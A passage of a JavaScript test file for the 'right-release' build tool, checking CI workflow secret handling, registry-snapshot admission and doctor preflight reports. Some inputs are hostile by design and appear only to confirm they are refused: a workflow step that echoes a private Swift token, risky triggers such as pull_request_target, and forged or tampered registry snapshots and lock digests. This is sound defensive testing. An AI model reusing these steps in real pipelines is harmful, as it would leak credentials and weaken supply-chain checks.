  swift: { privatePackages: SWIFT_PRIVATE, check: { runner: "macos-15", xcodeVersion: "16.4", projectDirectory: "ios", spec: "project.yml", project: "Widgets.xcodeproj", scheme: "Widgets", xcodegenVersion: "2.44.1" } },
};

test("swift-check accepts standalone managed workflow with declared read-only Swift credential", () => {
  assert.deepEqual(validateManifest(SWIFT_CHECK_ONLY).errors, []);
  const workflows = renderedWorkflows(SWIFT_CHECK_ONLY);
  assert.deepEqual(jobsNamingSwiftSecret(workflows["swift-check.yml"]), ["swift-check"]);
  const result = releaseWithManagedWorkflows(SWIFT_CHECK_ONLY, workflows);
  assert.equal(result.status, 0, result.stderr);
});

test("swift-check rejects private credential outside shared steps and on arbitrary-ref triggers", () => {
  const workflows = renderedWorkflows(SWIFT_CHECK_ONLY);
  for (const trigger of ["workflow_dispatch", "pull_request_target", "workflow_run"]) {
    const changed = editText(workflows["swift-check.yml"], "  pull_request:", `  ${trigger}:`);
    assertRefused(SWIFT_CHECK_ONLY, { "swift-check.yml": changed }, new RegExp(trigger), trigger);
  }
  const changed = editJob(workflows["swift-check.yml"], "swift-check", (source) => source + "\n      - run: echo ${{ secrets.SWIFT_PRIVATE_TOKEN }}\n");
  assertRefused(SWIFT_CHECK_ONLY, { "swift-check.yml": changed }, SWIFT_ENV_LINE, "secret in run");
  const extraJob = workflows["swift-check.yml"] + "\n  other:\n    runs-on: macos-15\n    steps:\n      - name: Configure private Swift package access\n        env:\n          RIGHT_GIT_PRIVATE_TOKEN_0: ${{ secrets.SWIFT_PRIVATE_TOKEN }}\n        run: true\n";
  assertRefused(SWIFT_CHECK_ONLY, { "swift-check.yml": extraJob }, /job 'other'/, "wrong job");
});

test("postSign accepts one command or an ordered array, scanned and run fail-closed", () => {
  const source = readFileSync(release, "utf8");
  assert.match(source, /function commandList\(value\) \{\s*if \(value == null\) return \[\];\s*return Array\.isArray\(value\) \? value : \[value\];/);
  assert.match(source, /async function runCommands\(value, root, options\) \{\s*for \(const command of commandList\(value\)\) await runCommand\(command, root, options\);/);
  // Every execution site uses the chain runner; none runs a raw postSign value.
  assert.doesNotMatch(source, /runCommand\(target\.postSign/);
  assert.equal((source.match(/runCommands\(target\.postSign, root\)/g) ?? []).length, 2);
  // Scanner inputs (forbidden features, feature closure texts, closure commands) expand every entry.
  const gates = readFileSync(new URL("./prebuild-gates.mjs", import.meta.url), "utf8");
  assert.match(gates, /\.\.\.commandList\(target\.postSign\)\.map\(/);
  // One closureCommands list (recipe-build plans unwrapped, #345 F1) feeds both the cargo-tree closure and the token scan.
  assert.match(gates, /const closureCommands = \[[^\n]*\.\.\.commandList\(target\.postSign\), target\.gradle(?:, \.\.\.switchInputs\.cargoCommands)?\][^\n]*expandRecipeBuildCommands/);
  assert.doesNotMatch(gates, /nativeFinalizer, target\.postSign, target\.gradle/);
});

test("run() timeout kills the whole process tree through background-process spawn and taskkill /T /F", () => {
  const source = readFileSync(release, "utf8");
  assert.match(source, /import \{ spawn, spawnSync \} from "\.\/background-process\.mjs"/);
  assert.doesNotMatch(source, new RegExp(`from "node:${"child"}_process"`));
  assert.match(source, /setTimeout\(\(\) => \{\s*killProcessTree\(child\.pid\);/);
  const heavy = readFileSync(path.join(path.dirname(release), "heavy-command.mjs"), "utf8");
  assert.match(heavy, /"\/PID", String\(pid\), "\/T", "\/F"/);
});

// ----- the worker handoff: a RightKit registry snapshot is accepted only from this release's admitted state.
function workerRun(config, env) {
  return spawnSync(process.execPath, [release, "--config", config, "--platform", "win", "--dry-run"], { encoding: "utf8", env });
}

test("the release worker refuses a missing, arbitrary, foreign, fabricated or stale RightKit registry snapshot", () => {
  const config = fixture({ platform: "win" });
  const stateless = managedEnv(config); // registry stub only: nothing was admitted
  const admitted = admittedWorkerEnv(config, "win");
  const withAdmitted = { ...stateless, ...admitted };
  const refused = (result, pattern) => { assert.notEqual(result.status, 0, result.stdout); assert.match(result.stderr, pattern); };

  assert.equal(workerRun(config, withAdmitted).status, 0);
  // nothing handed to the worker: it never resolves on its own and never trusts the bundled data
  refused(workerRun(config, stateless), /no admitted RightKit registry snapshot was handed to the release worker/);
  // a snapshot env that points anywhere but the state root's own admitted snapshot
  const copy = path.join(tempRoot("right-release-snap-"), "snap.json");
  writeFileSync(copy, readFileSync(admitted.RIGHT_RELEASE_RIGHTKIT_SNAPSHOT));
  refused(workerRun(config, { ...withAdmitted, RIGHT_RELEASE_RIGHTKIT_SNAPSHOT: copy }), /not the admitted snapshot of this release/);
  refused(workerRun(config, { ...withAdmitted, RIGHT_RELEASE_STATE_ROOT: "" }), /RIGHT_RELEASE_STATE_ROOT is not set/);
  // state admitted for another release (another platform here; commit and id are covered the same way)
  refused(workerRun(config, { ...stateless, ...admittedWorkerEnv(config, "mac") }), /belongs to another release/);
  // an admission record that was never written (a snapshot dropped into a state root)
  const orphan = admittedWorkerEnv(config, "win");
  unlinkSync(path.join(orphan.RIGHT_RELEASE_STATE_ROOT, "rightkit-admission.json"));
  refused(workerRun(config, { ...stateless, ...orphan }), /no admission record exists for this release/);
  // a fabricated snapshot recorded as admitted but internally inconsistent: no latest observations
  refused(workerRun(config, { ...stateless, ...admittedWorkerEnv(config, "win", { mutate: (snapshot) => { snapshot.latest = []; } }) }), /no latest observation for/);
  // a fabricated snapshot whose registry digest disagrees with the lock
  refused(workerRun(config, { ...stateless, ...admittedWorkerEnv(config, "win", { mutate: (snapshot) => { snapshot.entries[0].registryDigest = "sha512-forged=="; } }) }), /registry digest does not equal the lock digest/);
  // an extra, unrelated verified entry
  refused(workerRun(config, { ...stateless, ...admittedWorkerEnv(config, "win", { mutate: (snapshot) => { snapshot.entries.push({ ...snapshot.entries[0], name: "@rightkit/ghost" }); snapshot.latest.push({ ...snapshot.latest[0], name: "@rightkit/ghost" }); } }) }), /@rightkit\/ghost [\d.]+ is in the bound registry snapshot but not in the locked inputs/);
  // the locks change after admission
  const lock = path.join(path.dirname(config), "pnpm-lock.yaml");
  const original = readFileSync(lock, "utf8");
  writeFileSync(lock, original.replace(/sha512-[0-9a-f]+==/, "sha512-00==") );
  refused(workerRun(config, withAdmitted), /lock digest changed since the bound registry snapshot/);
});

// doctor --gates: the doctor runs the build's pre-build source gates (prebuild-gates.mjs) in the same order.
const FORBIDDEN_PACKAGE = { cmd: "cargo", args: ["build", "--features", "test-mode"] };

// Host- and run-dependent lines are dropped (the Windows signing header and signtool row among them); what remains is the doctor's stable output.
function normalizeDoctor(output, config) {
  return output
    .split(path.dirname(config)).join("<DIR>")
    .split(/\r?\n/)
    .filter((line) => !/^(rightkit-registry|workdir|hardeningscan|config|sign):|\] (disk|ownership|target-bridge|compiler-cache|sccache|signtool):|^\s+fix: |^\s*$/.test(line))
    .join("\n")
    .replace(/^right-release \d+\.\d+\.\d+/m, "right-release <version>")
    .replace(/^platform: .*/m, "platform: <host>");
}

test("doctor without --gates keeps its output (golden) and prints no gate rows", () => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac", packageCommand: FORBIDDEN_PACKAGE });
  const result = runDoctor(config);
  const output = `${result.stdout}`;
  assert.doesNotMatch(output, /gate:/);
  // A Windows checkout may convert the golden file's line endings; its content is what is compared.
  const golden = readFileSync(new URL("./test-support/doctor-golden.txt", import.meta.url), "utf8").replace(/\r\n/g, "\n");
  assert.equal(normalizeDoctor(output, config).trim(), golden.trim());
});

test("doctor --gates reports a forbidden feature as a gate FAIL row and exits 1", () => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac", packageCommand: FORBIDDEN_PACKAGE });
  const result = runDoctor(config, "--gates");
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  assert.match(result.stdout, /^\s*\[FAIL\] gate:build-features: release\/update build refused: .*\n- target\.package: enables feature `test-mode`/m);
  assert.match(result.stderr, /preflight found \d+ blocking problem\(s\)/);
});

test("doctor --gates fails a missing switches.json like the build, and --gates needs --doctor", () => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" });
  const result = runDoctor(config, "--gates");
  // The only gate finding on a clean fixture is the missing inventory (the feature closure never reaches a live broker in tests).
  assert.match(result.stdout, /^\s*\[FAIL\] gate:(switch-inventory-missing|feature-closure): /m);
  const bare = runRaw(config, "--platform", hostPlatform, "--dry-run", "--gates");
  assert.equal(bare.status, 2);
  assert.match(bare.stderr, /--gates is valid only with --doctor/);
});

test("the gates never ask cargo tree for --target all on a win target without a triple", async () => {
  const config = fixture({ platform: "win" });
  const loaded = (await import(`${new URL(`file://${config}`).href}?t=${Date.now()}`)).default;
  const { findings } = evaluatePrebuildGates({ root: path.dirname(config), config: loaded, target: loaded.targets.win, platform: "win", strict: true });
  const text = findings.map((f) => f.detail).join("\n");
  assert.match(text, /cargo tree .*--target x86_64-pc-windows-msvc/, text);
  assert.doesNotMatch(text, /--target all\b/);
});

test("build refusal text for a gate finding is unchanged", () => {
  const config = fixture({ platform: "win", packageCommand: FORBIDDEN_PACKAGE });
  const result = run(config);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /^right-release: release\/update build refused: it enables a test-automation or debugging feature \(test-mode, qa-native, [^)]*\); none may ship:\n- target\.package: enables feature `test-mode`\nRemove the feature from the release build command, the app's default features and its tauri dependency; dev builds \(`right-release dev`\) may keep it\. No app may ship devtools unless it is on the allow-list in devtools-policy\.json and declares `devtools: "content-only"` \(rightkit-tauri-shell DevToolsPolicy::ContentOnly\)\.\n/m);
  // E01: the build reports every gate finding of the run (the first one's text is unchanged above), not only the first.
  assert.match(result.stderr, /\nright-release: feature closure: release code must not contain or read a test/);
});

// E01 / R01: one doctor run (and one build run) lists every independent config finding; a check that needs a failed one is
// BLOCKED by it; nothing builds after a finding. Fixture configs are plain modules: edit, then commit so the doctor accepts them.
test("doctor lists every independent config finding in one run, including updater.keyFile", () => {
  const config = editConfig(fixture({ platform: hostPlatform, qa: false, macSigning: hostPlatform === "mac" }), (value) => {
    value.targets[hostPlatform].signed = false;
    value.targets[hostPlatform].updater.keyFile = "%APPDATA%/RightKit/updater.key";
  });
  const result = runDoctor(config);
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  // three unrelated findings, one run
  assert.match(result.stderr, /must declare signed: true; unsigned release targets are forbidden/);
  assert.match(result.stderr, new RegExp(`targets\\.${hostPlatform}\\.updater\\.keyFile is not supported: updater signing keys come from the OS credential provider`));
  assert.match(result.stderr, /RightKit QA|@rightkit\/qa/i);
  assert.match(result.stderr, /preflight found [3-9]\d* blocking problem\(s\)/);
  // the doctor went on to its machine rows instead of stopping at the first one
  assert.match(result.stdout, /^preflight:/m);
});

test("doctor reports what a failed check keeps from running as not run because it failed, and counts only the failed check", () => {
  const config = editConfig(fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" }), (value) => {
    delete value.targets[hostPlatform];
  });
  const result = runDoctor(config, "--gates");
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  assert.match(result.stderr, new RegExp(`has no ${hostPlatform} release target`));
  assert.match(result.stderr, /the target checks .* not run because target failed/);
  assert.match(result.stderr, /build-inputs not run because target failed/);
  assert.doesNotMatch(result.stderr, /BLOCKED by/, "a check that did not run is not a blocking problem of its own");
  assert.match(result.stdout, /\[FAIL\] gate:prebuild-gates: BLOCKED by target/);
  // a handled finding, never an uncaught exception with a stack
  assert.doesNotMatch(result.stderr, /\n\s+at .*\.mjs:\d+/);
});

test("the build reports every config finding together, refuses updater.keyFile and runs nothing after a finding", () => {
  const config = editConfig(fixture({ platform: "win" }), (value) => {
    value.targets.win.signed = false;
    value.targets.win.updater.keyFile = "%APPDATA%/RightKit/updater.key";
  });
  const result = run(config);
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  assert.match(result.stderr, /must declare signed: true; unsigned release targets are forbidden/);
  assert.match(result.stderr, /targets\.win\.updater\.keyFile is not supported[^\n]*OS credential provider/);
  // no build step started: the header and every step line come after the checkpoint
  assert.doesNotMatch(result.stdout, /right-release \d+\.\d+\.\d+: fixture win package/);
  assert.doesNotMatch(result.stdout, /right-release: done/);
});

test("release.mjs never forwards a key file to sign-updater", () => {
  assert.doesNotMatch(readFileSync(release, "utf8"), /--key-file|updater\?\.keyFile \?/);
});

// ---- A-05: the package rules are independent findings, not the first of 21 process exits -------------------------------------------
const fixturePackage = (extra = {}) => ({
  name: "fixture",
  scripts: { [`release:patch:${hostPlatform}`]: `right-release --platform ${hostPlatform} --tier patch` },
  packageManager: versions.packageManager,
  dependencies: { "@rightkit/license": versions.npm["@rightkit/license"], "@rightkit/logs": versions.npm["@rightkit/logs"] },
  devDependencies: { "@rightkit/release": versions.npm["@rightkit/release"] },
  ...extra,
});

function withWorkflow(config, name = "ci.yml") {
  const dir = path.dirname(config);
  mkdirSync(path.join(dir, ".github", "workflows"), { recursive: true });
  writeFileSync(path.join(dir, ".github", "workflows", name), "name: ci\non: push\njobs: {}\n");
  git(dir, "add", ".");
  git(dir, "commit", "-m", "add a workflow");
  return config;
}

test("doctor prints three package-contract violations and a hosted-workflow violation in one run, exits 1, with no stack trace", () => {
  const config = withWorkflow(fixture({
    platform: hostPlatform,
    macSigning: hostPlatform === "mac",
    packageJson: fixturePackage({
      scripts: { "release:patch": "node ../tools/right-release/cli.mjs build" },
      packageManager: "pnpm@9.0.0",
      dependencies: { "@rightkit/license": "git+https://github.com/bogusyogi/rightkit.git" },
    }),
  }));
  const result = runDoctor(config);
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  assert.match(result.stderr, new RegExp(`^right-release: fixture packageManager must be ${versions.packageManager}, got pnpm@9\\.0\\.0$`, "m"));
  assert.match(result.stderr, /^right-release: fixture package\.json must call the right-release bin, not parent-workspace release source$/m);
  assert.match(result.stderr, /^right-release: fixture @rightkit\/license must come from the published npm package, not git\+https:\/\/github\.com\/bogusyogi\/rightkit\.git$/m);
  assert.match(result.stderr, /^right-release: fixture hosted workflow files are forbidden: ci\.yml /m);
  // none of the four stopped the run: the machine rows came after them, and nothing says the doctor stopped
  assert.match(result.stdout, /^preflight:/m);
  assert.doesNotMatch(result.stderr, /doctor stopped here/);
  assert.doesNotMatch(result.stderr, /\n\s+at .*\.mjs:\d+/);
});

test("each package rule blocks only what reads its result: an unreadable package.json is one finding, the rules beside it still run", () => {
  const config = withWorkflow(fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" }));
  const dir = path.dirname(config);
  writeFileSync(path.join(dir, "package.json"), "{ not json");
  git(dir, "add", ".");
  git(dir, "commit", "-m", "break package.json");
  const result = runDoctor(config);
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  assert.match(result.stderr, /^right-release: Unexpected token|^right-release: .*JSON/m, "the unreadable package.json is the finding");
  assert.match(result.stderr, /^right-release: qa-backdoor-contract not run because package-json failed$/m);
  assert.match(result.stderr, /^right-release: package-manager not run because package-json failed$/m);
  assert.match(result.stderr, /^right-release: fixture hosted workflow files are forbidden: ci\.yml /m, "the workflow rule does not read package.json and still runs");
  assert.match(result.stdout, /^preflight:/m);
});

// ---- A-03: the doctor applies the build's registry admission ------------------------------------------------------------------------
const STALE = { RK_TEST_LATEST: "@rightkit/license@@99.0.0" };

test("doctor refuses a RightKit pin behind the registry's latest, as the build does; --inspect lists it as information; --admission is the same as the default", () => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" });
  const refused = runDoctorWith(config, STALE);
  assert.equal(refused.status, 1, `${refused.stdout}\n${refused.stderr}`);
  assert.match(refused.stderr, new RegExp(`fixture RightKit pins are behind the latest published version \\(build admission refused\\):\\n- @rightkit/license pinned ${versions.npm["@rightkit/license"].replaceAll(".", "\\.")} -> latest 99\\.0\\.0`));
  assert.doesNotMatch(refused.stdout, /newer RightKit version \(informational\)/);
  const alias = runDoctorWith(config, STALE, "--admission");
  assert.equal(alias.status, 1);
  assert.match(alias.stderr, /RightKit pins are behind the latest published version/);
  const inspected = runDoctorWith(config, STALE, "--inspect");
  assert.match(inspected.stdout, /^right-release: newer RightKit version \(informational\): @rightkit\/license pinned \S+ -> latest 99\.0\.0/m);
  assert.doesNotMatch(inspected.stderr, /build admission refused/);
  assertDoctorFailsClosedOnlyOnOwnership(inspected);
  const contradiction = runDoctorWith(config, STALE, "--inspect", "--admission");
  assert.equal(contradiction.status, 2);
  assert.match(contradiction.stderr, /--inspect and --admission contradict each other/);
});

test("one stale RightKit pin is one blocking problem: the checks that read the registry result are listed as not run, never counted, and the doctor-owned row names itself", () => {
  const config = fixture({ platform: hostPlatform, macSigning: hostPlatform === "mac" });
  const result = runDoctorWith(config, STALE);
  assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
  assert.match(result.stderr, /^right-release: rightkit-registry: fixture RightKit pins are behind the latest published version \(build admission refused\):$/m, "A-01: the doctor names the row");
  for (const name of ["rightkit-pin-specs", "rightkit-release-supported", "rightkit-cargo-contract"]) {
    assert.match(result.stderr, new RegExp(`^right-release: ${name} not run because rightkit-registry failed$`, "m"), name);
  }
  assert.doesNotMatch(result.stderr, /BLOCKED by/);
  // the count is the failed machine rows plus the one stale pin, whatever this host's machine rows say
  const machineFailures = (result.stdout.match(/^\s*\[FAIL\] /gm) ?? []).length;
  assert.equal(/^right-release: preflight found (\d+) blocking problem/m.exec(result.stderr)?.[1], String(machineFailures + 1), result.stderr);
});

test("a clean fixture doctor --inspect exits 0 with no finding other than ownership, with the guard's cargo and with hosted CI's", () => {
  // On hosted CI the broker guard does not answer a bare `cargo`, so the fixture's cargo shim must answer `cargo metadata` itself.
  for (const ci of ["false", "true"]) {
    const config = fixture({
      platform: hostPlatform,
      macSigning: hostPlatform === "mac",
      cargoManifest: `[package]\nname = "fixture"\nversion = "0.0.0"\nedition = "2021"\n[dependencies]\nrightkit-license = "=0.1.2"`,
    });
    const result = spawnSync(process.execPath, [release, "--doctor", "--config", config, "--platform", hostPlatform, "--inspect"], { encoding: "utf8", env: managedEnv(config, { env: { CI: ci } }) });
    const output = `CI=${ci}\n${result.stdout}\n${result.stderr}`;
    assertDoctorFailsClosedOnlyOnOwnership(result);
    assert.doesNotMatch(output, /not valid JSON|Unexpected token|rightkit-cargo-contract/, output);
    assert.match(result.stdout, /^rightkit-registry: \d+ exact pins verified against the registries \(cargo 1, npm \d+\)/m, `the Cargo pin was read through cargo metadata\n${output}`);
    // Exit 0 when ownership is only a warning on this host; otherwise exit 1 for the one ownership problem and nothing else.
    const ownershipBlocks = /^\s*\[FAIL\] ownership: /m.test(result.stdout);
    assert.equal(result.status, ownershipBlocks ? 1 : 0, output);
    assert.equal(/^right-release: preflight found (\d+) blocking problem/m.exec(result.stderr)?.[1] ?? "0", ownershipBlocks ? "1" : "0", output);
  }
});

test("--inspect and --strict belong to the doctor", () => {
  const config = fixture({ platform: "win" });
  for (const flag of ["--inspect", "--strict"]) {
    const result = runRaw(config, "--platform", "win", "--dry-run", flag);
    assert.equal(result.status, 2, flag);
    assert.match(result.stderr, new RegExp(`${flag} is valid only with --doctor`));
  }
});

// ---- A-04: the declared lint and typecheck, with NOT RUN said out loud ---------------------------------------------------------------
test("doctor says NOT RUN for declared checks it cannot run, never a pass, and --strict makes that a blocking problem", () => {
  const config = fixture({
    platform: hostPlatform,
    macSigning: hostPlatform === "mac",
    configExtra: { checks: ["typecheck"] },
    packageJson: fixturePackage({ scripts: { typecheck: "tsc --noEmit", [`release:patch:${hostPlatform}`]: "right-release" } }),
  });
  const relaxed = runDoctor(config);
  assert.match(relaxed.stderr, /^right-release: NOT RUN declared-checks-run: not installed: no node_modules in /m);
  assert.doesNotMatch(relaxed.stderr, /declared-checks-run: check/);
  assertDoctorFailsClosedOnlyOnOwnership(relaxed);
  const strict = runDoctor(config, "--strict");
  assert.equal(strict.status, 1, `${strict.stdout}\n${strict.stderr}`);
  assert.match(strict.stderr, /^right-release: NOT RUN declared-checks-run: /m);
  assert.match(strict.stderr, /preflight found [1-9]\d* blocking problem\(s\); the build would fail on these/);
});
